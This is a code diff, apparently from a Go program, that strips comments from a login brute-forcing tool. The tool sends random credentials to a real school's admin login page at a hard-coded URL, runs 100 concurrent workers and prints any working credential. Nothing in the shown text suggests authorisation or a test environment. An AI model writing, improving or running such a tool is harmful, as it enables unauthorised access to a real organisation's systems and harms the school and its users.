@@ -16,7 +16,6 @@ const (
 	concurrency = 100
 )
 
-// Generate a random string of given length
 func randomString(length int) (string, error) {
 	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 	var result []byte
@@ -30,7 +29,6 @@ func randomString(length int) (string, error) {
 	return string(result), nil
 }
 
-// Attempt to login with random credentials
 func tryLogin(id int, requestCount *int, requestCountMutex *sync.Mutex, results chan<- string) {
 	url := "http://www.mdsr.ac.th/admin_School/index.php"
 
@@ -77,7 +75,7 @@ func tryLogin(id int, requestCount *int, requestCountMutex *sync.Mutex, results 
 			return
 		}
 
-		time.Sleep(100 * time.Millisecond) // Avoid hammering the server too quickly
+		time.Sleep(100 * time.Millisecond)
 	}
 }
 
@@ -96,7 +94,7 @@ func main() {
 			fmt.Println(result)
 			// Optionally, you can decide to exit after finding a valid credential
 			// return
-		case <-time.After(10 * time.Minute): // Timeout if desired
+		case <-time.After(10 * time.Minute):
 			fmt.Println("Timeout reached or completed.")
 			return
 		}
